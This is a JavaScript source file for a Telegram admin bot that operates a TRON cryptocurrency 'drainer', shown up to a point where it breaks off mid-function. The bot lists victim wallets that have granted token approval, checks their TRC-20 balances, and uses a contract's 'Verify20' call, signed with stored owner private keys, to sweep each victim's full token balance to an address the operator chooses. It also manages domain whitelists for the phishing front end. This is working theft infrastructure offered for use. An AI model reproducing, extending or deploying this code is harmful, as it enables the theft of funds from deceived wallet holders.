const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const { promises: fsp } = require("fs");
const path = require('path');
const util = require("util");
const exec = util.promisify(require("child_process").exec);
const TronWeb = require('tronweb').TronWeb;

let configRoot = require("./get-config");
let { SETTINGS, ADMINS, TELEGRAM_TOKEN_ID, TRONGRID_API_KEY, TRONSCAN_API_KEY, MIN_TRX_RESERVE } = configRoot;

const PARAM_TYPES = {
  domains: "domainArray",
  receiverAddress: "string",
  contractAddress: "string",
  contractOwnerAddress: "string",
  contractOwnerPrivateKey: "string",
  minTrxBalance: "number",
  minTokenBalance: "number",
  telegramChatId: "string",
  useAutowithdraw: "boolean",
  mode: "number",
};

const DOMAIN_REGEX = /^(?!-)(?:[a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,}$/;

const PARAM_HINTS = {
  domains: "(A list of domains allowed to make requests to the server, e.g. domain1.com, domain2.com)",
  receiverAddress: "(Tron address that will receive tokens, e.g. TKZKFP...)",
  contractAddress: "(Tron contract address)",
  contractOwnerAddress: "(Tron address that deployed the contract, e.g. TKZKFP...)",
  contractOwnerPrivateKey: "(Private key of the Tron address that deployed the contract)",
  minTrxBalance: "(Minimum TRX balance required, recommend at least 10)",
  minTokenBalance: "(Minimum trc-20 balance required, recommend at least 1)",
  telegramChatId: "(Telegram chat ID, e.g. -1001234.....)",
  useAutowithdraw: "(true/false)",
  mode: "(Mode setting)",
};

const PARAM_RESTRICTIONS = {
  domains: (value) => {
    const arr = Array.isArray(value) ? value : String(value).split(",");
    return arr.every(v => DOMAIN_REGEX.test(v.trim()));
  },
  receiverAddress: v => /^T[a-zA-Z0-9]{33}$/.test(v),
  contractAddress: v => /^T[a-zA-Z0-9]{33}$/.test(v),
  contractOwnerAddress: v => /^T[a-zA-Z0-9]{33}$/.test(v),
  contractOwnerPrivateKey: v => typeof v === "string" && v.length > 0,
  minTrxBalance: v => !isNaN(Number(v)) && Number(v) >= 10,
  minTokenBalance: v => !isNaN(Number(v)) && Number(v) >= 1,
  telegramChatId: v => /^-?\d+$/.test(v),
  useAutowithdraw: v => ["true", "false"].includes(String(v).toLowerCase()),
  mode: v => [1, 2, 3, 4].includes(Number(v)),
};

function loadConfig() {
  delete require.cache[require.resolve("./get-config")];
  configRoot = require("./get-config");
  SETTINGS = configRoot.SETTINGS;
  ADMINS = configRoot.ADMINS;
  TELEGRAM_TOKEN_ID = configRoot.TELEGRAM_TOKEN_ID;
  return configRoot;
}

function parseValue(param, value) {
  const type = PARAM_TYPES[param] || "string";
  try {
    if (type === "number") return Number(value);
    if (type === "boolean") return value.toLowerCase() === "true";
    if (type === "array") return value.split(",").map(v => v.trim());
    if (type === "domainArray") return value.split(",").map(v => v.trim());
    return value;
  } catch {
    return value;
  }
}

const isAdmin = id => ADMINS.includes(id);

async function saveConfig(cfg) {
  await fsp.writeFile("./data/config.json", JSON.stringify(cfg, null, 2));
}

function getConfigById(id) {
  const cfg = loadConfig().SETTINGS.find(c => c.id == id);
  if (!cfg) throw new Error("Config not found");
  return cfg;
}

function maskPrivateKey(key) {
  if (!key || key.length < 10) return "******";
  return key.slice(0, 6) + "..." + key.slice(-4);
}

function formatApprovedAt(iso) {
  try {
    if (!iso) return 'N/A';
    const d = new Date(iso);
    if (isNaN(d)) return 'N/A';
    return d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
  } catch {
    return 'N/A';
  }
}

async function checkUserBalance(userAddress, tokenId) {
  try {
    const response = await fetch(
      `https://apilist.tronscanapi.com/api/account/tokens?address=${userAddress}`,
      {
        headers: {
          'TRON-PRO-API-KEY': TRONSCAN_API_KEY
        }
      }
    );
    if (!response.ok) {
      return null;
    }
    const result = await response.json();
    const tokensList = result.data || [];
    const tokenInfo = tokensList.find(token => token.tokenId === tokenId);
    if (!tokenInfo) {
      return { balance: 0, quantity: 0, amountInUsd: 0 };
    }
    const { balance, quantity, amountInUsd } = tokenInfo;
    return { balance, quantity, amountInUsd };
  } catch (error) {
    return null;
  }
}

async function checkOwnerBalance(ownerAddress) {
  try {
    const response = await fetch(
      `https://apilist.tronscanapi.com/api/account/tokens?address=${ownerAddress}`,
      {
        headers: {
          'TRON-PRO-API-KEY': TRONSCAN_API_KEY
        }
      }
    );
    if (!response.ok) {
      return null;
    }
    const result = await response.json();
    const tokensList = result.data || [];
    const trxToken = tokensList.find(
      token => token.tokenId === '_' && token.tokenType === 'trc10'
    );
    if (!trxToken) {
      return 0;
    }
    return trxToken.quantity;
  } catch (error) {
    return null;
  }
}

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': TRONGRID_API_KEY },
});

async function withdrawTRC20(userAddress, tokenId, tokenBalance, contractAddress, contractOwnerPrivateKey, ownerAddress, receiverAddress) {
  async function waitForSuccess(txid, { timeoutMs = 120000, pollInterval = 3000 } = {}) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      try {
        const tx = await tronWeb.trx.getTransaction(txid);
        if (tx && tx.ret && tx.ret[0] && tx.ret[0].contractRet) {
          const result = String(tx.ret[0].contractRet).toUpperCase();
          return { found: true, success: result === 'SUCCESS', tx };
        }
      } catch (err) {
      }
      await new Promise(r => setTimeout(r, pollInterval));
    }
    return { found: false, timeout: true };
  }
  try {
    const functionSelector = `Verify20(address,address,address,uint256)`;
    const parameter = [
      { type: 'address', value: tokenId },
      { type: 'address', value: userAddress },
      { type: 'address', value: receiverAddress },
      { type: 'uint256', value: tokenBalance }
    ];
    const constTrigger = await tronWeb.transactionBuilder.triggerConstantContract(contractAddress, functionSelector, {}, parameter, ownerAddress);
    const energyUsed = constTrigger && constTrigger.energy_used ? constTrigger.energy_used : 0;
    const feeLimit = Math.round((energyUsed || 0) * 420 * 1.1) || 1000000;
    const triggerRes = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, functionSelector, { feeLimit }, parameter, ownerAddress);
    const unSignedTx = triggerRes && triggerRes.transaction ? triggerRes.transaction : null;
    if (!unSignedTx) {
      throw new Error('Failed to build unsigned transaction');
    }
    const extendExpirationObj = await tronWeb.transactionBuilder.extendExpiration(unSignedTx, 3600);
    const signedTx = await tronWeb.trx.sign(extendExpirationObj, contractOwnerPrivateKey);
    const sentTx = await tronWeb.trx.sendRawTransaction(signedTx);
    if (!sentTx) {
      throw new Error('sendRawTransaction returned empty response');
    }
    if (sentTx.code === 'BANDWITH_ERROR') {
      throw new Error('Insufficient balance on the OPERATOR wallet');
    }
    const txID = sentTx.txid || sentTx.txID || (sentTx.transaction && (sentTx.transaction.txid || sentTx.transaction.txID)) || null;
    if (!txID) {
      throw new Error('No txid returned from node');
    }
    const waitRes = await waitForSuccess(txID, { timeoutMs: 120000, pollInterval: 3000 });
    if (waitRes.timeout || !waitRes.found) {
      throw new Error('Timeout waiting for transaction result');
    }
    if (!waitRes.success) {
      throw new Error('Transaction executed but not SUCCESS');
    }
    return { txid: txID, tx: waitRes.tx };
  } catch (error) {
    throw error;
  }
}

async function sendOrEdit(bot, { chatId, query }, text, options = {}) {
  if (query && query.message) {
    const chat_id = query.message.chat.id;
    const message_id = query.message.message_id;
    try {
      await bot.editMessageText(text, {
        chat_id,
        message_id,
        parse_mode: options.parse_mode || "HTML",
        reply_markup: options.reply_markup,
        disable_web_page_preview: options.disable_web_page_preview || false,
      });
    } catch (err) {
      try {
        await bot.sendMessage(chatId || chat_id, text, options);
      } catch (err2) {
      }
    }
    if (query && query.id) {
      await bot.answerCallbackQuery(query.id).catch(() => { });
    }
  } else {
    await bot.sendMessage(chatId, text, options);
  }
}

async function showConfig(bot, { chatId, query, configId }) {
  const cfg = getConfigById(configId);
  const { transactionTitle, transactionMessage, ...rest } = cfg;
  let text = `⚙️ <b>Config ID:</b> <code>${cfg.id}</code>\n\n`;
  for (const [key, val] of Object.entries(rest)) {
    if (Array.isArray(val)) {
      text += `• <b>${key}</b>:\n${val.map((d, i) => `${i + 1}. <code>${d}</code>`).join("\n")}\n`;
    } else {
      const displayVal = (key === "contractOwnerPrivateKey")
        ? `${maskPrivateKey(val)}`
        : val;
      text += `• <b>${key}</b>: <code>${displayVal}</code>\n`;
    }
  }
  const reply_markup = {
    inline_keyboard: [
      [{ text: "✏️ Edit Config", callback_data: `editconfig_${cfg.id}` }],
      [{ text: "🔙 Back", callback_data: "back_mainmenu" }],
    ],
  };
  await sendOrEdit(bot, { chatId, query }, text, { parse_mode: "HTML", reply_markup });
}

async function showApprovedWallets(bot, { chatId, query }) {
  try {
    const data = await fsp.readFile("./data/approved-wallets.json", 'utf8');
    const wallets = JSON.parse(data);
    if (!wallets.length) {
      await sendOrEdit(bot, { chatId, query }, "ℹ️ No wallets approved yet.");
      return;
    }
    const buttons = wallets.map(w => ([{
      text: w.address,
      callback_data: `wallet_${w.address}`
    }]));
    await sendOrEdit(bot, { chatId, query }, "✅ Approved wallets:", {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    });
  } catch (err) {
    await sendOrEdit(bot, { chatId, query }, "❌ Could not read approved wallets.");
  }
}

const editingState = {};

function createBot() {
  const bot = new TelegramBot(TELEGRAM_TOKEN_ID, { polling: true });

  const origSendMessage = bot.sendMessage.bind(bot);
  const origEditMessageText = bot.editMessageText.bind(bot);

  bot.sendMessage = async (chatId, text, options = {}) => {
    options = options || {};
    text = (typeof text === "string") ? text : String(text);
    text = `<b>${text}</b>`;
    options.parse_mode = options.parse_mode || "HTML";
    return origSendMessage(chatId, text, options);
  };

  bot.editMessageText = async (text, options = {}) => {
    options = options || {};
    text = (typeof text === "string") ? text : String(text);
    text = `<b>${text}</b>`;
    options.parse_mode = options.parse_mode || "HTML";
    return origEditMessageText(text, options);
  };

  const mainMenu = {
    reply_markup: {
      keyboard: [
        ["⚙️ Drainer Settings"],
        ["🔐 Approved Wallets"],
        ["🔄 Restart Server"],
        ["📄 Show Logs"],
      ],
      resize_keyboard: true,
    },
  };

  const pm2ErrorLog = path.join(process.env.HOME || ".", ".pm2", "logs", "server-error.log");
  const pm2OutLog = path.join(process.env.HOME || ".", ".pm2", "logs", "server-out.log");

  (async () => {
    try {
      if (fs.existsSync("./data/last-restart.json")) {
        const raw = await fsp.readFile("./data/last-restart.json", "utf8");
        const last = JSON.parse(raw);
        if (last.chatId) {
          await bot.sendMessage(last.chatId, "✅ Server restarted successfully", mainMenu);
          await fsp.unlink("./data/last-restart.json");
        }
      }
    } catch (error) {
    }
  })();

  bot.on("message", async (msg) => {
    const userId = msg.from.id;
    if (!isAdmin(userId)) {
      await bot.sendMessage(msg.chat.id, "🚫 No permission.");
      return;
    }

    const state = editingState[userId];

    if (state && state.type === 'withdraw_input') {
      const { wallet } = state;
      const chatId = msg.chat.id;
      const messageId = state.messageId;
      const entered = (msg.text || "").trim();

      const mainMenuButtons = ["⚙️ Drainer Settings", "🔐 Approved Wallets", "🔄 Restart Server", "📄 Show Logs"];
      if (entered && (entered.startsWith("/") || mainMenuButtons.includes(entered))) {
        delete editingState[userId];
      } else {
        if (!entered) {
          delete editingState[userId];
          return;
        }
        if (entered && !entered.startsWith("/")) {
          if (state.lastInvalid) {
            delete state.lastInvalid;
            delete state.errorMessageId;
          }
        }
        if (!/^T[a-zA-Z0-9]{33}$/.test(entered)) {
          const reply_markup = {
            inline_keyboard: [
              [{ text: "🔙 Back", callback_data: `wallet_${wallet.address}` }]
            ]
          };
          try {
            const sent = await bot.sendMessage(chatId, `❌ Invalid address: <code>${entered}</code>`, { reply_markup });
            editingState[userId] = Object.assign(editingState[userId] || {}, { lastInvalid: true, errorMessageId: sent.message_id });
          } catch (e) {
            editingState[userId] = Object.assign(editingState[userId] || {}, { lastInvalid: true });
          }
          return;
        }

        const confirmMarkup = {
          inline_keyboard: [
            [
              { text: "✅ Yes", callback_data: "confirm_withdraw_yes" },
              { text: "❌ No", callback_data: "confirm_withdraw_no" }
            ]
          ]
        };

        const confirmText = `Are you sure you want to withdraw tokens to <code>${entered}</code>?`;

        try {
          const sent = await bot.sendMessage(chatId, confirmText, { reply_markup: confirmMarkup });
          editingState[userId] = {
            type: 'withdraw_confirm',
            wallet,
            targetAddress: entered,
            chatId: sent.chat.id || chatId,
            messageId: sent.message_id
          };
        } catch (e) {
          editingState[userId] = { type: 'withdraw_confirm', wallet, targetAddress: entered, chatId: state.chatId || chatId, messageId: state.messageId || null };
          if (state.chatId && state.messageId) {
            try {
              await bot.editMessageText(confirmText, {
                chat_id: state.chatId,
                message_id: state.messageId,
                reply_markup: confirmMarkup
              });
            } catch (err) {
              await bot.sendMessage(chatId, confirmText, { reply_markup: confirmMarkup });
            }
          } else {
            await bot.sendMessage(chatId, confirmText, { reply_markup: confirmMarkup });
          }
        }

        return;
      }
    }

    if (state && state.type === 'config') {
      const { configId, param } = state;
      let cfg;
      try {
        cfg = getConfigById(configId);
      } catch {
        delete editingState[userId];
        return;
      }

      if (msg.text && (msg.text.startsWith("/") || ["⚙️ Drainer Settings", "🔐 Approved Wallets"].includes(msg.text))) {
        delete editingState[userId];
        return;
      }

      if (PARAM_RESTRICTIONS[param] && !PARAM_RESTRICTIONS[param](msg.text)) {
        const reply_markup = {
          inline_keyboard: [
            [{ text: "🔙 Back", callback_data: `editconfig_${configId}` }]
          ]
        };
        const hint = PARAM_HINTS[param] ? `\n\nExpected: ${PARAM_HINTS[param]}` : '';
        await bot.sendMessage(msg.chat.id, `❌ Invalid value for <b>${param}</b>.${hint}`, { reply_markup });
        return;
      }

      if (param === "domains_add") {
        const domain = msg.text.trim();
        if (!DOMAIN_REGEX.test(domain)) {
          const reply_markup = {
            inline_keyboard: [
              [{ text: "🔙 Back", callback_data: `editconfig_${configId}` }]
            ]
          };
          await bot.sendMessage(
            msg.chat.id,
            `❌ Invalid domain: <code>${domain}</code>\n\nPlease enter a valid domain (e.g. example.com):`,
            { reply_markup }
          );
          return;
        }
        cfg.domains.push(domain);
        await saveConfig(configRoot);
        delete editingState[userId];

        await bot.sendMessage(
          msg.chat.id,
          `✅ Domain added: <code>${domain}</code>\n\n📄 Config updated below 👇`
        );
        await showConfig(bot, { chatId: msg.chat.id, configId: cfg.id });
        return;
      }

      cfg[param] = parseValue(param, msg.text);
      await saveConfig(configRoot);
      delete editingState[userId];

      await bot.sendMessage(
        msg.chat.id,
        `✅ <b>${param}</b> updated to <code>${msg.text}</code>\n\n📄 Config updated below 👇`
      );
      await showConfig(bot, { chatId: msg.chat.id, configId: cfg.id });
      return;
    }

    const text = msg.text;
    if (text === "/start") {
      await bot.sendMessage(msg.chat.id, "👋 Welcome, admin!", mainMenu);
    } else if (text === "⚙️ Drainer Settings") {
      const reply_markup = {
        inline_keyboard: configRoot.SETTINGS.map(c => ([ 
          { text: `🔘 Config №${c.id}`, callback_data: `config_${c.id}` }
        ]))
      };
      await bot.sendMessage(msg.chat.id, "⚙️ Select config:", { reply_markup });
    } else if (text === "🔐 Approved Wallets") {
      await showApprovedWallets(bot, { chatId: msg.chat.id });
    } else if (text === "🔄 Restart Server") {
      await fsp.writeFile("./data/last-restart.json", JSON.stringify({ chatId: msg.chat.id }));
      await bot.sendMessage(msg.chat.id, "♻️ Flushing logs and restarting server...");
      try {
        const { stdout, stderr } = await exec("pm2 flush && pm2 restart server.js");
      } catch (error) {
        await bot.sendMessage(msg.chat.id, `❌ Restart failed: ${error.message}`);
      }
    } else if (text === "📄 Show Logs") {
      try {
        let sentAny = false;
        if (fs.existsSync(pm2ErrorLog)) {
          await bot.sendDocument(msg.chat.id, pm2ErrorLog, {}, {
            filename: "server-error.log",
            contentType: "text/plain"
          });
          sentAny = true;
        }
        if (fs.existsSync(pm2OutLog)) {
          await bot.sendDocument(msg.chat.id, pm2OutLog, {}, {
            filename: "server-out.log",
            contentType: "text/plain"
          });
          sentAny = true;
        }
        if (!sentAny) {
          await bot.sendMessage(msg.chat.id, "ℹ️ No logs found.");
        }
      } catch (err) {
        await bot.sendMessage(msg.chat.id, "❌ Could not send logs.");
      }
    } else {
      await bot.sendMessage(msg.chat.id, "❓ Unknown command. Use /start.");
    }
  });

  bot.on("callback_query", async (query) => {
    const userId = query.from.id;
    if (!isAdmin(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "🚫 No permission", show_alert: true });
    }

    const data = query.data;

    if (editingState[userId]) {
      const st = editingState[userId];
      if (st.type === 'config') {
        delete editingState[userId];
      } else if (st.type === 'withdraw_input') {
        if (st.lastInvalid) {
          delete editingState[userId];
        } else {
          if (!data.startsWith('wallet_')) {
            delete editingState[userId];
          }
        }
      } else if (st.type === 'withdraw_confirm') {
        if (!(data === 'confirm_withdraw_yes' || data === 'confirm_withdraw_no' || data.startsWith('wallet_'))) {
          delete editingState[userId];
        }
      }
    }

    try {
      if (data === "back_wallets_list_new") {
        try {
          await showApprovedWallets(bot, { chatId: query.message.chat.id });
        } catch (e) {
        }
        return;
      }

      if (data.startsWith("wallet_")) {
        const selectedAddress = data.substring("wallet_".length);
        const raw = await fsp.readFile("./data/approved-wallets.json", "utf8");
        const wallets = JSON.parse(raw);
        const wallet = wallets.find(w => w.address === selectedAddress);
        if (!wallet) {
          await bot.answerCallbackQuery(query.id, { text: "❌ Wallet not found", show_alert: true });
          return;
        }

        let userBalanceData = null;
        let ownerBalance = null;
        try {
          userBalanceData = await checkUserBalance(wallet.address, wallet.tokenContract);
          ownerBalance = await checkOwnerBalance(wallet.contractOwnerAddress);
        } catch (err) {
          userBalanceData = null;
          ownerBalance = null;
        }

        if (userBalanceData === null || ownerBalance === null) {
          const errorText = '❗️ API request error, please try again later';
          const reply_markup = {
            inline_keyboard: [
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };
          await sendOrEdit(bot, { query }, errorText, { reply_markup });
          return;
        }

        wallet._lastBalance = userBalanceData || { balance: 0, quantity: 0, amountInUsd: 0 };

        const quantity = (userBalanceData.quantity ?? 0);
        const amountInUsd = (userBalanceData.amountInUsd ?? 0);
        const ownerTrx = (ownerBalance ?? 0);
        const approvedAtStr = formatApprovedAt(wallet.approvedAt);

        let text = `💰 <b>Wallet Details</b>\n\n`;
        text += `• Approval time: <code>${approvedAtStr}</code>\n`;
        text += `• User Address: <code>${wallet.address}</code>\n`;
        text += `• Token Name: <code>${wallet.tokenName}</code>\n`;
        text += `• Token Contract: <code>${wallet.tokenContract}</code>\n`;
        text += `• Token Amount: <code>${quantity}</code>\n`;
        text += `• Token Balance In USD: <code>${amountInUsd} $</code>\n`;
        text += `• Contract Address: <code>${wallet.contractAddress}</code>\n`;
        text += `• Contract Owner Address: <code>${wallet.contractOwnerAddress}</code>\n`;
        text += `• Contract Owner Private Key: <code>${maskPrivateKey(wallet.contractOwnerPrivateKey)}</code>\n`;
        text += `• Contract Owner Balance: <code>${ownerTrx} TRX</code>\n`;

        const reply_markup = {
          inline_keyboard: [
            [{ text: "♻️ Withdraw Tokens", callback_data: `withdraw_tokens_${wallet.address}` }],
            [{ text: "❌ Remove Wallet", callback_data: `remove_wallet_${wallet.address}` }],
            [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
          ]
        };

        editingState[userId] = { type: 'wallet', wallet, chatId: query.message?.chat?.id, messageId: query.message?.message_id };

        await sendOrEdit(bot, { query }, text, { reply_markup });
        return;
      }

      if (data === "back_wallets_list") {
        await showApprovedWallets(bot, { query });
        return;
      }

      if (data.startsWith("withdraw_tokens_")) {
        const walletAddress = data.split("_")[2];
        const raw = await fsp.readFile("./data/approved-wallets.json", "utf8");
        const wallets = JSON.parse(raw);
        const wallet = wallets.find(w => w.address === walletAddress);
        if (!wallet) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Wallet not found", show_alert: true });
        }

        try {
          const prev = editingState[userId];
          if (prev && prev.wallet && prev.wallet.address === wallet.address && prev.wallet._lastBalance) {
            wallet._lastBalance = prev.wallet._lastBalance;
          }
        } catch (e) {
        }

        let userBalanceData = null;
        try {
          userBalanceData = await checkUserBalance(wallet.address, wallet.tokenContract);
        } catch (err) {
          userBalanceData = null;
        }

        if (userBalanceData === null) {
          const errorText = '❗️ API request error, please try again later';
          const reply_markup = {
            inline_keyboard: [
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };
          await sendOrEdit(bot, { query }, errorText, { reply_markup });
          return;
        }

        const quantity = (typeof userBalanceData.quantity !== "undefined" && userBalanceData.quantity !== null)
          ? userBalanceData.quantity
          : 0;

        if (Number(quantity) <= 0) {
          const errorText = `❗️ TRC-20 address balance is zero. Transaction cannot be performed`;
          try {
            if (query && query.message && query.message.chat && query.message.message_id) {
              await bot.editMessageText(errorText, {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
              });
            } else {
              await bot.sendMessage(query.message.chat.id, errorText);
            }
          } catch (err) {
          }

          const amountInUsd = (userBalanceData && userBalanceData.amountInUsd) ? userBalanceData.amountInUsd : 0;
          const approvedAtStr = formatApprovedAt(wallet.approvedAt);
          let walletText = `💰 <b>Wallet Details</b>\n\n`;
          walletText += `• Approval time: <code>${approvedAtStr}</code>\n`;
          walletText += `• User Address: <code>${wallet.address}</code>\n`;
          walletText += `• Token Name: <code>${wallet.tokenName}</code>\n`;
          walletText += `• Token Contract: <code>${wallet.tokenContract}</code>\n`;
          walletText += `• Token Amount: <code>${quantity}</code>\n`;
          walletText += `• Token Balance In USD: <code>${amountInUsd} $</code>\n`;
          walletText += `• Contract Address: <code>${wallet.contractAddress}</code>\n`;
          walletText += `• Contract Owner Address: <code>${wallet.contractOwnerAddress}</code>\n`;
          walletText += `• Contract Owner Private Key: <code>${maskPrivateKey(wallet.contractOwnerPrivateKey)}</code>\n`;

          let ownerTrx = 0;
          try {
            ownerTrx = await checkOwnerBalance(wallet.contractOwnerAddress);
          } catch (err) {
            ownerTrx = null;
          }
          walletText += `• Contract Owner Balance: <code>${ownerTrx ?? 'N/A'} TRX</code>\n`;

          const walletReply = {
            inline_keyboard: [
              [{ text: "♻️ Withdraw Tokens", callback_data: `withdraw_tokens_${wallet.address}` }],
              [{ text: "❌ Remove Wallet", callback_data: `remove_wallet_${wallet.address}` }],
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };

          try {
            const sentCard = await bot.sendMessage(query.message.chat.id, walletText, { reply_markup: walletReply });
            editingState[userId] = { type: 'wallet', wallet, chatId: sentCard.chat.id, messageId: sentCard.message_id };
          } catch (err) {
          }

          try { await bot.answerCallbackQuery(query.id).catch(() => {}); } catch (e) {}
          return;
        }

        wallet._lastBalance = userBalanceData || { balance: 0, quantity: 0, amountInUsd: 0 };

        let ownerBalance = null;
        try {
          ownerBalance = await checkOwnerBalance(wallet.contractOwnerAddress);
        } catch (err) {
          ownerBalance = null;
        }

        if (ownerBalance === null) {
          const errorText = '❗️ API request error, please try again later';
          const reply_markup = {
            inline_keyboard: [
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };
          await sendOrEdit(bot, { query }, errorText, { reply_markup });
          return;
        }

        if (Number(ownerBalance) < MIN_TRX_RESERVE) {
          const errorText = `❗️ Contract Owner TRX balance is too low to perform the transaction. Current balance: <code>${ownerBalance} TRX</code>. Minimum required: <code>${MIN_TRX_RESERVE} TRX</code>. Please top up the account and try again.`;
          try {
            if (query && query.message && query.message.chat && query.message.message_id) {
              await bot.editMessageText(errorText, {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
              });
            } else {
              await bot.sendMessage(query.message.chat.id, errorText);
            }
          } catch (err) {
          }

          let userBalanceData2 = null;
          try {
            userBalanceData2 = await checkUserBalance(wallet.address, wallet.tokenContract);
          } catch (err) {
            userBalanceData2 = null;
          }

          const quantity2 = (userBalanceData2 && userBalanceData2.quantity) ? userBalanceData2.quantity : 0;
          const amountInUsd2 = (userBalanceData2 && userBalanceData2.amountInUsd) ? userBalanceData2.amountInUsd : 0;
          const ownerTrx = ownerBalance ?? 0;
          const approvedAtStr = formatApprovedAt(wallet.approvedAt);

          let walletText = `💼 <b>Wallet Details</b>\n\n`;
          walletText += `• Approval time: <code>${approvedAtStr}</code>\n`;
          walletText += `• User Address: <code>${wallet.address}</code>\n`;
          walletText += `• Token Name: <code>${wallet.tokenName}</code>\n`;
          walletText += `• Token Contract: <code>${wallet.tokenContract}</code>\n`;
          walletText += `• Token Amount: <code>${quantity2}</code>\n`;
          walletText += `• Token Balance In USD: <code>${amountInUsd2} $</code>\n`;
          walletText += `• Contract Address: <code>${wallet.contractAddress}</code>\n`;
          walletText += `• Contract Owner Address: <code>${wallet.contractOwnerAddress}</code>\n`;
          walletText += `• Contract Owner Private Key: <code>${maskPrivateKey(wallet.contractOwnerPrivateKey)}</code>\n`;
          walletText += `• Contract Owner Balance: <code>${ownerTrx} TRX</code>\n`;

          const walletReply = {
            inline_keyboard: [
              [{ text: "♻️ Withdraw Tokens", callback_data: `withdraw_tokens_${wallet.address}` }],
              [{ text: "❌ Remove Wallet", callback_data: `remove_wallet_${wallet.address}` }],
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };

          try {
            const sentCard = await bot.sendMessage(query.message.chat.id, walletText, { reply_markup: walletReply });
            editingState[userId] = { type: 'wallet', wallet, chatId: sentCard.chat.id, messageId: sentCard.message_id };
          } catch (err) {
          }

          try { await bot.answerCallbackQuery(query.id).catch(() => {}); } catch (e) {}
          return;
        }

        editingState[userId] = {
          type: 'withdraw_input',
          wallet,
          chatId: query.message.chat.id,
          messageId: query.message.message_id
        };

        const reply_markup = {
          inline_keyboard: [
            [{ text: "🔙 Back", callback_data: `wallet_${wallet.address}` }]
          ]
        };

        await sendOrEdit(bot, { query }, "Enter recipient address:", { reply_markup });
        return;
      }

      if (data === "confirm_withdraw_yes") {
        const st = editingState[userId];
        if (!st || st.type !== 'withdraw_confirm') {
          return bot.answerCallbackQuery(query.id, { text: "❌ Nothing to confirm", show_alert: true });
        }
        const { wallet, targetAddress, chatId, messageId } = st;

        const loadingText = `Transaction sent, awaiting result...`;
        try {
          await bot.editMessageText(loadingText, { chat_id: chatId, message_id: messageId });
        } catch (e) {
          try {
            await bot.sendMessage(chatId, loadingText);
          } catch (sendErr) {
          }
        }

        let tokenBalance = '0';
        try {
          const last = wallet && wallet._lastBalance ? wallet._lastBalance : null;
          if (last) {
            if (typeof last.balance !== 'undefined' && last.balance !== null && String(last.balance) !== '') {
              tokenBalance = String(last.balance);
            } else if (typeof last.quantity !== 'undefined' && last.quantity !== null && String(last.quantity) !== '') {
              tokenBalance = String(last.quantity);
            } else {
              tokenBalance = '0';
            }
          } else {
            tokenBalance = '0';
          }
        } catch (e) {
          tokenBalance = '0';
        }

        try {
          let isZero = true;
          try {
            isZero = (BigInt(tokenBalance) === 0n);
          } catch (e) {
            isZero = (Number(tokenBalance) === 0);
          }
          if (isZero) {
            const infoText = `❗️ TRC-20 address balance is zero. Transaction cannot be performed`;
            const infoMarkup = { inline_keyboard: [[{ text: "Main Menu", callback_data: "back_wallets_list_new" }]] };
            try {
              await bot.editMessageText(infoText, { chat_id: chatId, message_id: messageId, reply_markup: infoMarkup });
            } catch (e) {
              await bot.sendMessage(chatId, infoText, { reply_markup: infoMarkup });
            }
            delete editingState[userId];
            return bot.answerCallbackQuery(query.id).catch(() => {});
          }
        } catch (e) {
        }

        try {
          const res = await withdrawTRC20(
            wallet.address,
            wallet.tokenContract,
            tokenBalance,
            wallet.contractAddress,
            wallet.contractOwnerPrivateKey,
            wallet.contractOwnerAddress,
            targetAddress
          );

          const txId = (res && (res.txid || res.txId || res.txID)) ? (res.txid || res.txId || res.txID) : (res && res.tx && (res.tx.txid || res.tx.txID) ? (res.tx.txid || res.tx.txID) : null);

          const successText = txId
            ? `Transaction successfully broadcasted. View on block explorer: https://tronscan.org/#/transaction/${txId}`
            : `Transaction successfully broadcasted. (no txId returned)`;

          const successMarkup = {
            inline_keyboard: [
              [{ text: "Main Menu", callback_data: "back_wallets_list_new" }]
            ]
          };

          try {
            await bot.editMessageText(successText, {
              chat_id: chatId,
              message_id: messageId,
              reply_markup: successMarkup
            });
          } catch (e) {
            await bot.sendMessage(chatId, successText, { reply_markup: successMarkup });
          }
        } catch (err) {
          const errMsg = err && err.message ? err.message : String(err);
          const errorText = `Error while sending transaction: ${errMsg}`;
          const errorMarkup = {
            inline_keyboard: [
              [{ text: "Main Menu", callback_data: "back_wallets_list_new" }]
            ]
          };
          try {
            await bot.editMessageText(errorText, {
              chat_id: chatId,
              message_id: messageId,
              reply_markup: errorMarkup
            });
          } catch (editErr) {
            try {
              await bot.sendMessage(chatId, errorText, { reply_markup: errorMarkup });
            } catch (sendErr) {
            }
          }
        }

        delete editingState[userId];
        return bot.answerCallbackQuery(query.id).catch(() => { });
      }

      if (data === "confirm_withdraw_no") {
        const st = editingState[userId];
        if (!st || st.type !== 'withdraw_confirm') {
          return bot.answerCallbackQuery(query.id, { text: "❌ Nothing to cancel", show_alert: true });
        }
        const { wallet, chatId, messageId } = st;

        delete editingState[userId];

        try {
          const raw = await fsp.readFile("./data/approved-wallets.json", "utf8");
          const wallets = JSON.parse(raw);
          const refreshed = wallets.find(w => w.address === wallet.address);
          if (!refreshed) {
            await bot.editMessageText("❌ Wallet not found", { chat_id: chatId, message_id: messageId });
            return;
          }

          let userBalanceData = null, ownerBalance = null;
          try {
            userBalanceData = await checkUserBalance(refreshed.address, refreshed.tokenContract);
            ownerBalance = await checkOwnerBalance(refreshed.contractOwnerAddress);
          } catch (err) {
            userBalanceData = null;
            ownerBalance = null;
          }

          if (userBalanceData === null || ownerBalance === null) {
            await bot.editMessageText('❗️ API request error, please try again later', {
              chat_id: chatId, message_id: messageId,
              reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_wallets_list" }]] }
            });
            return;
          }

          const quantity = (userBalanceData.quantity ?? 0);
